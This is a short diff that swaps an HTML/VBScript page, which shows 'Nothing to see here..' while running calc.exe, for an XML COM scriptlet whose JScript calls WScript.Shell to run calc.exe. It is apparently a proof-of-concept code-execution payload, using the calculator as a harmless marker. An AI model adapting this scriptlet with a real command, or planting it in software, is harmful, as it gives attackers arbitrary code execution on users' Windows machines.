@@ -1,14 +1,12 @@
-<html>
-<head>
-<script language="VBScript"> 
-    Sub RunProgram
-        Set objShell = CreateObject("Wscript.Shell")
-        objShell.Run "calc.exe"
-    End Sub
-RunProgram()
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+  progid="TESTING"
+  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
+  <script language="JScript">
+    <![CDATA[
+      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
+    ]]>
 </script>
-</head> 
-<body>
-    Nothing to see here..
-</body>
-</html>
+</registration>
+</scriptlet>
